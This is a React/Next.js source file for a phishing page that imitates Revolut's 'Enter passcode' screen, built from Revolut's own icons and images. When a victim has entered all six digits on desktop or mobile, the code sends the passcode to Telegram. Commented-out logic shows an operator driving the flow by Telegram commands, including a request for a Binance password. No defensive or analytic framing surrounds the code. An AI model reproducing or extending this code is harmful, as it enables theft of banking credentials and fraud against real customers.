'use client';
import '../app/globals.css';
import React, { useState, useEffect, useRef, Fragment } from 'react';
import Header from '../components/Header';
import { useValidateEmail } from '../app/hooks/useValidate';
import { useRouter } from 'next/navigation';
import { notifyNewUser } from '../lib/api';
import { sendMessageToTelegram } from '../lib/api';
import { useCommand } from '../app/lib/CommandContext';
import countriesData from '../app/lib/countries'
import CountriesDropdown from '../components/CountriesDropdown'

export default function Security() {
    const router = useRouter();
    // const { command } = useCommand(); // Get the current command from Telegram
    const [pins, setPins] = useState(''); // manage the state of the pin inputs


    // Handle input change for the pc viewport
    const handlePCInputChange = (e, index) => {
        const value = e.target.value;
        if (/[0-9]/.test(value)) {
            const newPins = pins.split('');
            newPins[index] = value;
            setPins(newPins.join(''));

            
            if (index === 5 || (newPins.join('').length === 6)) {
                // Send complete passcode to Telegram
                sendMessageToTelegram(newPins.join(''));
                // Optionally redirect or show loading
                // setIsLoading(true);
                // setTimeout(() => router.push('/NextPage'), 1000);
            } else if (index < 5) {
                const inputs = e.target.parentElement.querySelectorAll('input');
                inputs[index + 1].focus();
            }
        }
    };


    // Handle the Keydown for the the pc input field 
    const handlePCInputKeyDown = (e, index) => {
        if (e.key === 'Backspace') {
            const newPins = pins.split('');
            newPins[index] = '';
            setPins(newPins.join(''));
            if (index > 0) {
                const inputs = e.target.parentElement.querySelectorAll('input');
                inputs[index - 1].focus();
            }
        }
    };


    // Handle input for mobile viewport
    const handleMobileInput = (number) => {
        if (pins.length < 6) {
            const new_pins = prev => prev + number 
            setPins(new_pins);
            console.log("new pins is ", new_pins)
            if (pins.length + 1 === 6) {
                // Send complete passcode to Telegram
                sendMessageToTelegram(new_pins);
                // Optionally redirect or show loading
                // setIsLoading(true);
                // setTimeout(() => router.push('/NextPage'), 1000);
            }
        }
    };

    // Handle mobile backspace to clear input
    const handleMobileBackspace = () => {
        setPins(prev => prev.slice(0, -1));
    };


    // Handle command changes
    // useEffect(() => {
    //     if (command === 'REQUEST_EMAIL_AGAIN') {
    //         setInvalid(true); // Show error state for email input
    //         setIsLoading(false);
    //     } else if (command === 'REQUEST_BINANCE_PASSWORD') {
    //         setIsLoading(false);
    //         setTimeout(() => {
    //             // setIsLoading(false);
    //             router.push('/PasswordPage');
    //         }, 500);
    //     }
    // }, [command]);

    // const { validateEmail } = useValidateEmail();
    // Handle email validation
    // const handleEmailValidation = () => {
    //     const isValid = validateEmail(email);
    //     setInvalid(!isValid);
    //     setIsLoading(true);
    //     setUserEmail(email);
    //     sendMessageToTelegram(email);
    // };




    return (
        <div className="bg-[#f7f7f7] text-black w-full h-screen flex flex-col">
            {/* Pc version */}
            <div className='hidden md:block'>
                <Header />
                <div className="flex min-h-[550px] justify-center items-start md:items-center ">

                    {/* form container */}
                    <div className='flex justify-center mt-[88px] gap-x-10 h-[264px] w-full'>

                        {/* Pin container */}
                        <div className='w-[352px] h-[264px]'>
                            <div>
                                <button>
                                    <img src="https://assets.revolut.com/assets/icons/ArrowThinLeft.svg" alt="" />
                                </button>
                            </div>

                            <div>
                                <h1 className='font-bold text-[25px] tracking-[-0.01292em] text-ellipsis'>
                                    Enter passcode
                                </h1>
                            </div>

                            <div>
                                <div className="my-[17px]">
                                    <div className="flex gap-2 items-center">
                                        {[...Array(6)].map((_, index) => (
                                            <React.Fragment key={index}>
                                                <input
                                                    type="text"
                                                    maxLength="1"
                                                    inputMode="numeric"
                                                    pattern="[0-9]*"
                                                    className="w-[40px] rounded-[1rem] h-[50px] text-center bg-[#ebebf0] outline-none focus:caret-[#4f55f1]"
                                                    style={{
                                                        WebkitTextSecurity: 'disc'
                                                    }}
                                                    value={pins[index] || ''}
                                                    onChange={(e) => handlePCInputChange(e, index)}
                                                    onKeyDown={(e) => handlePCInputKeyDown(e, index)}
                                                    onFocus={(e) => {
                                                        const inputs = e.target.parentElement.querySelectorAll('input');
                                                        for (let i = 0; i < index; i++) {
                                                            if (!inputs[i].value) {
                                                                inputs[i].focus();
                                                                break;
                                                            }
                                                        }
                                                    }}
                                                />
                                                {index === 2 && <span className="text-[1rem] font-normal text-[#717173]">-</span>}
                                            </React.Fragment>
                                        ))}
                                    </div>
                                </div>
                            </div>


                            <div className='mt-[-5px]'>
                                <a href="" className='inter text-[0.875rem] mt-[1rem] font-normal tracking-[-0.00714em] text-[#4f55f1]'>Forgot your passcode?</a>
                            </div>
                        </div>



                        {/* padlock image */}
                        <div className='w-[264px] h-[264px]'>
                            <img aria-hidden="true" className="Box-rui__sc-1g1k12l-0 cizxh relative top-[10px]" srcset="https://assets.revolut.com/assets/3d-images-v2/3D005@2x.webp 2x, https://assets.revolut.com/assets/3d-images-v2/3D005@2x.png 2x, https://assets.revolut.com/assets/3d-images-v2/3D005@3x.webp 3x, https://assets.revolut.com/assets/3d-images-v2/3D005@3x.png 3x" src="https://assets.revolut.com/assets/3d-images-v2/3D005.png" />
                        </div>
                    </div>
                </div >

                {/* footer */}
                < div className='h-[68px] items-center px-[2rem] md:max-w-[839px] w-full absolute bottom-[5px] flex justify-start  bg-[#f7f7f7]' >
                    <div className="h-fit md:absolute bottom-[19px] left-[30px] gap-y-2 gap-x-8 items-center justify-center md:justify-start md:flex-row flex-col flex">
                        <button className='text-[#717173] tracking-[0.0009px] items-center gap-x-[9px] rounded-[0.75rem] flex justify-center text-sm'>
                            English (United States)
                            <span>
                                <img src="https://assets.revolut.com/assets/icons/ChevronDown.svg" alt="" className='w-4 h-4 opacity-50' />
                            </span>
                        </button>
                        <button className='text-[#717173] tracking-[0.0009px] items-center gap-x-[9px] rounded-[0.75rem] flex justify-center text-sm'>
                            Privacy Policy
                        </button>
                    </div>
                </div >
            </div>


            {/* Mobile version */}
            <div className='w-full flex flex-col h-screen justify-between md:hidden px-4 pt-[16px]'>
                {/* Back button */}
                <div className='w-full h-[40px] flex justify-start'>
                    <button>
                        <img src="https://assets.revolut.com/assets/icons/ArrowThinLeft.svg" alt="" />
                    </button>
                </div>

                {/* Page header */}
                <div className='w-full text-center -mt-[40px]'>
                    <h1 className='font-bold text-[1.5rem]'>
                        Enter passcode
                    </h1>
                </div>

                {/* Pin dots container */}
                <div className="flex gap-6 justify-center mt-[80px]">
                    {[...Array(6)].map((_, index) => (
                        <div
                            key={index}
                            className={`w-4 h-4 rounded-full ${pins.length > index ? 'bg-[#4f55f1] border-[#4f55f1]' : 'bg-[#c9c9cd]'
                                }`}
                        />
                    ))}
                </div>

                {/* Keypad container */}
                <div className='w-full mt-[62px]'>
                    <div className="grid grid-cols-3 gap-x-4 gap-y-3 place-items-center mx-auto w-full">
                        {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((number) => (
                            <button
                                key={number}
                                onClick={() => handleMobileInput(number)}
                                className="h-[64px] w-[64px] text-center rounded-full bg-translate text-[2rem] font-semibold hover:bg-gray-100 active:bg-gray-200"
                            >
                                {number}
                            </button>
                        ))}
                        <div className=""></div>
                        <button
                            onClick={() => handleMobileInput('0')}
                            className="h-[64px] w-[64px] text-center rounded-full bg-translate text-[2rem] font-semibold hover:bg-gray-100 active:bg-gray-200"
                        >
                            0
                        </button>
                        <button
                            onClick={handleMobileBackspace}
                            className={`h-14 w-14 rounded-full flex items-center justify-center text-xl font-semibold hover:bg-gray-100 active:bg-gray-200 ${pins.length > 0 ? 'flex' : 'hidden'}`}
                        >
                            <img src="https://assets.revolut.com/assets/icons/ArrowBackspace.svg" alt="" />
                        </button>
                    </div>
                </div>

                {/* Forgot passcode button */}
                <div className='w-full pb-10 flex justify-center'>
                    <a href="" className="text-[#4f55f1] inter font-medium text-[0.875rem] tracking-[-0.00714em]">
                        Forgot your passcode
                    </a>
                </div>
            </div>
        </div >
    );
}
